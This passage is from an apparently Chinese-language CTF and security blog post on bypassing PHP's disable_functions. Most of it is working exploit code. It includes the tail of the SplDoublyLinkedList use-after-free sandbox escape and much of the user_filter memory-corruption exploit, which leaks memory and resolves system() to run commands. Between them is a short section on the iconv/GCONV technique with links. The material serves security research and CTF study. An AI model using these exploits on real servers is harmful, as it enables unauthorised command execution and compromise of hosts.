        <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$data_addr</span> <span class="o">+</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$deref</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
            <span class="c1"># &#39;bin2hex&#39; constant check
</span><span class="c1"></span>            <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x786568326e6962</span><span class="p">)</span>
                <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>

        <span class="k">return</span> <span class="nv">$data_addr</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$basic_funcs</span><span class="p">;</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="nv">$f_entry</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$addr</span><span class="p">);</span>
        <span class="nv">$f_name</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$f_entry</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="nv">$f_name</span> <span class="o">==</span> <span class="mh">0x6d6574737973</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># system
</span><span class="c1"></span>            <span class="k">return</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$addr</span> <span class="o">+=</span> <span class="mh">0x20</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nv">$f_entry</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">get_system_address</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$base</span> <span class="o">=</span> <span class="nx">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">);</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;ELF base: 0x&#39;</span> <span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$base</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
    <span class="nv">$elf</span> <span class="o">=</span> <span class="nx">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">);</span>
    <span class="nv">$basic_funcs</span> <span class="o">=</span> <span class="nx">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">);</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Basic functions: 0x&#39;</span> <span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
    <span class="nv">$zif_system</span> <span class="o">=</span> <span class="nx">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$zif_system</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$dlls</span> <span class="o">=</span> <span class="p">[];</span>
<span class="nv">$strs</span> <span class="o">=</span> <span class="p">[];</span>
<span class="nv">$rw_dll</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplDoublyLinkedList</span><span class="p">();</span>


<span class="c1"># Create a chain of dangling triggers, which will all in turn
</span><span class="c1"># free current-&gt;next, push an element to the next list, and free current
</span><span class="c1"># This will make sure that every current-&gt;next points the same memory block,
</span><span class="c1"># which we will UAF.
</span><span class="c1"></span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">NB_DANGLING</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplDoublyLinkedList</span><span class="p">();</span>
    <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">DanglingTrigger</span><span class="p">(</span><span class="nv">$i</span><span class="p">));</span>
    <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">rewind</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1"># We want our UAF&#39;d list element to be before two strings, so that we can
</span><span class="c1"># obtain the address of the first string, and increase is size. We then have
</span><span class="c1"># R/W over all memory after the obtained address.
</span><span class="c1"></span><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;NB_STRS&#39;</span><span class="p">,</span> <span class="mi">50</span><span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">NB_STRS</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$strs</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">str_shuffle</span><span class="p">(</span><span class="nx">str_repeat</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="nx">SIZE_ELEM_STR</span><span class="p">));</span>
    <span class="nx">i2s</span><span class="p">(</span><span class="nv">$strs</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">STR_MARKER</span><span class="p">);</span>
    <span class="nx">i2s</span><span class="p">(</span><span class="nv">$strs</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="mi">8</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1"># Free one string in the middle, ...
</span><span class="c1"></span><span class="nv">$strs</span><span class="p">[</span><span class="nx">NB_STRS</span> <span class="o">-</span> <span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="mi">123</span><span class="p">;</span>
<span class="c1"># ... and put the to-be-UAF&#39;d list element instead.
</span><span class="c1"></span><span class="nv">$dlls</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="c1"># Setup the last DLlist, which will exploit the UAF
</span><span class="c1"></span><span class="nv">$dlls</span><span class="p">[</span><span class="nx">NB_DANGLING</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplDoublyLinkedList</span><span class="p">();</span>
<span class="nv">$dlls</span><span class="p">[</span><span class="nx">NB_DANGLING</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">UAFTrigger</span><span class="p">());</span>
<span class="nv">$dlls</span><span class="p">[</span><span class="nx">NB_DANGLING</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">rewind</span><span class="p">();</span>

<span class="c1"># Trigger the bug on the first list
</span><span class="c1"></span><span class="nv">$dlls</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">offsetUnset</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210129105249462.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210129105249462.png, https://gitee.com/leonsec/images/raw/master/image-20210129105249462.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210129105249462.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210129105249462.png"
        title="image-20210129105249462" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210129105444759.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210129105444759.png, https://gitee.com/leonsec/images/raw/master/image-20210129105444759.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210129105444759.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210129105444759.png"
        title="image-20210129105444759" /></p>
<p>先知上有师傅复现了，可以参考：https://xz.aliyun.com/t/8355</p>
<p>exp作者分析：<a href="https://ssd-disclosure.com/ssd-advisory-php-spldoublylinkedlist-uaf-sandbox-escape/" target="_blank" rel="noopener noreffer">SSD Advisory – PHP SplDoublyLinkedList UAF Sandbox Escape - SSD Secure Disclosure</a></p>
<h2 id="iconv">iconv</h2>
<p>前段时间ByteCTF2020的<code>Wallbreaker2020</code>出了这个考点，线上赛出了非预期，用<code>Backtrace Bypass</code>的exp，<code>Exception</code>类改成<code>Error</code>类可以绕过disable_classes</p>
<p>复现环境：<a href="https://github.com/baiyecha404/CTFWEBchallenge/tree/master/bytectf2020/wallbreaker2020" target="_blank" rel="noopener noreffer">CTFWEBchallenge/bytectf2020/wallbreaker2020 at master · baiyecha404/CTFWEBchallenge</a></p>
<p>使用iconv绕过disable_function的分析：<a href="https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/" target="_blank" rel="noopener noreffer">Getting Arbitrary Code Execution from fopen&rsquo;s 2nd Argument</a></p>
<p>利用条件：</p>
<ul>
<li>可以上传文件</li>
<li><code>putenv</code></li>
<li><code>iconv()</code>、<code>iconv_strlen()</code>、php://filter的<code>convert.iconv</code></li>
</ul>
<p>利用过程参考：<a href="https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80" target="_blank" rel="noopener noreffer">Bypass shell_exec or system disabled functions by using GCONV (PHP rce to system())</a></p>
<p>以及<code>byc_404</code>师傅的<a href="https://hackmd.io/@byc404/HJBlno_3P" target="_blank" rel="noopener noreffer">bypass diable_function with iconv - HackMD</a></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210129114232134.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210129114232134.png, https://gitee.com/leonsec/images/raw/master/image-20210129114232134.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210129114232134.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210129114232134.png"
        title="image-20210129114232134" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210129114355535.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210129114355535.png, https://gitee.com/leonsec/images/raw/master/image-20210129114355535.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210129114355535.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210129114355535.png"
        title="image-20210129114355535" /></p>
<h2 id="user_filter">User_filter</h2>
<blockquote>
<p><a href="https://bugs.php.net/bug.php?id=54350" target="_blank" rel="noopener noreffer">Memory corruption with user_filter</a></p>
</blockquote>
<p>影响范围：</p>
<ul>
<li>5.* - exploitable with minor changes to the PoC</li>
<li>7.0 - all versions to date</li>
<li>7.1 - all versions to date</li>
<li>7.2 - all versions to date</li>
<li>7.3 - all versions to date</li>
<li>7.4 - all versions to date</li>
<li>8.0 - all versions to date</li>
</ul>
<p>poc: <a href="https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php" target="_blank" rel="noopener noreffer">PHP 7.0-8.0 disable_functions bypass [user_filter]</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="c1"># PHP 7.0-8.0 disable_functions bypass PoC (*nix only)
</span><span class="c1">#
</span><span class="c1"># Bug: https://bugs.php.net/bug.php?id=54350
</span><span class="c1"># 
</span><span class="c1"># This exploit should work on all PHP 7.0-8.0 versions
</span><span class="c1"># released as of 2021-10-06
</span><span class="c1">#
</span><span class="c1"># Author: https://github.com/mm0r1
</span><span class="c1"></span>
<span class="nx">pwn</span><span class="p">(</span><span class="s1">&#39;uname -a&#39;</span><span class="p">);</span>

<span class="k">function</span> <span class="nf">pwn</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">define</span><span class="p">(</span><span class="s1">&#39;LOGGING&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
    <span class="nx">define</span><span class="p">(</span><span class="s1">&#39;CHUNK_DATA_SIZE&#39;</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">);</span>
    <span class="nx">define</span><span class="p">(</span><span class="s1">&#39;CHUNK_SIZE&#39;</span><span class="p">,</span> <span class="nx">ZEND_DEBUG_BUILD</span> <span class="o">?</span> <span class="nx">CHUNK_DATA_SIZE</span> <span class="o">+</span> <span class="mh">0x20</span> <span class="o">:</span> <span class="nx">CHUNK_DATA_SIZE</span><span class="p">);</span>
    <span class="nx">define</span><span class="p">(</span><span class="s1">&#39;FILTER_SIZE&#39;</span><span class="p">,</span> <span class="nx">ZEND_DEBUG_BUILD</span> <span class="o">?</span> <span class="mh">0x70</span> <span class="o">:</span> <span class="mh">0x50</span><span class="p">);</span>
    <span class="nx">define</span><span class="p">(</span><span class="s1">&#39;STRING_SIZE&#39;</span><span class="p">,</span> <span class="nx">CHUNK_DATA_SIZE</span> <span class="o">-</span> <span class="mh">0x18</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    <span class="nx">define</span><span class="p">(</span><span class="s1">&#39;CMD&#39;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$groom</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">Pwn</span><span class="o">::</span><span class="na">alloc</span><span class="p">(</span><span class="nx">STRING_SIZE</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nx">stream_filter_register</span><span class="p">(</span><span class="s1">&#39;pwn_filter&#39;</span><span class="p">,</span> <span class="s1">&#39;Pwn&#39;</span><span class="p">);</span>
    <span class="nv">$fd</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;php://memory&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
    <span class="nx">stream_filter_append</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="s1">&#39;pwn_filter&#39;</span><span class="p">);</span>
    <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Helper</span> <span class="p">{</span> <span class="k">public</span> <span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">,</span> <span class="nv">$c</span><span class="p">;</span> <span class="p">}</span>
<span class="k">class</span> <span class="nc">Pwn</span> <span class="k">extends</span> <span class="k">php_user_filter</span> <span class="p">{</span>
    <span class="k">private</span> <span class="nv">$abc</span><span class="p">,</span> <span class="nv">$abc_addr</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$helper</span><span class="p">,</span> <span class="nv">$helper_addr</span><span class="p">,</span> <span class="nv">$helper_off</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$uafp</span><span class="p">,</span> <span class="nv">$hfp</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span> <span class="nv">$out</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$consumed</span><span class="p">,</span> <span class="nv">$closing</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$closing</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
        <span class="nx">stream_bucket_make_writeable</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filtername</span> <span class="o">=</span> <span class="nx">Pwn</span><span class="o">::</span><span class="na">alloc</span><span class="p">(</span><span class="nx">STRING_SIZE</span><span class="p">);</span>
        <span class="nx">fclose</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">stream</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">go</span><span class="p">();</span>
        <span class="k">return</span> <span class="nx">PSFS_PASS_ON</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">go</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filtername</span><span class="p">;</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">make_uaf_obj</span><span class="p">();</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Helper</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="nv">$x</span><span class="p">)</span> <span class="p">{};</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_addr</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str2ptr</span><span class="p">(</span><span class="nx">CHUNK_SIZE</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">-</span> <span class="nx">CHUNK_SIZE</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="s2">&#34;helper @ 0x%x&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_addr</span><span class="p">);</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc_addr</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_addr</span> <span class="o">-</span> <span class="nx">CHUNK_SIZE</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="s2">&#34;abc @ 0x%x&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc_addr</span><span class="p">);</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_off</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_addr</span> <span class="o">-</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc_addr</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">;</span>

        <span class="nv">$helper_handlers</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str2ptr</span><span class="p">(</span><span class="nx">CHUNK_SIZE</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="s2">&#34;helper handlers @ 0x%x&#34;</span><span class="p">,</span> <span class="nv">$helper_handlers</span><span class="p">);</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">prepare_leaker</span><span class="p">();</span>

        <span class="nv">$binary_leak</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$helper_handlers</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="s2">&#34;binary leak @ 0x%x&#34;</span><span class="p">,</span> <span class="nv">$binary_leak</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">prepare_cleanup</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">);</span>

        <span class="nv">$closure_addr</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str2ptr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_off</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="s2">&#34;real closure @ 0x%x&#34;</span><span class="p">,</span> <span class="nv">$closure_addr</span><span class="p">);</span>

        <span class="nv">$closure_ce</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$closure_addr</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="s2">&#34;closure class_entry @ 0x%x&#34;</span><span class="p">,</span> <span class="nv">$closure_ce</span><span class="p">);</span>

        <span class="nv">$basic_funcs</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_basic_funcs</span><span class="p">(</span><span class="nv">$closure_ce</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="s2">&#34;basic_functions @ 0x%x&#34;</span><span class="p">,</span> <span class="nv">$basic_funcs</span><span class="p">);</span>

        <span class="nv">$zif_system</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="s2">&#34;zif_system @ 0x%x&#34;</span><span class="p">,</span> <span class="nv">$zif_system</span><span class="p">);</span>

        <span class="nv">$fake_closure_off</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_off</span> <span class="o">+</span> <span class="nx">CHUNK_SIZE</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x138</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$fake_closure_off</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$closure_addr</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$fake_closure_off</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>

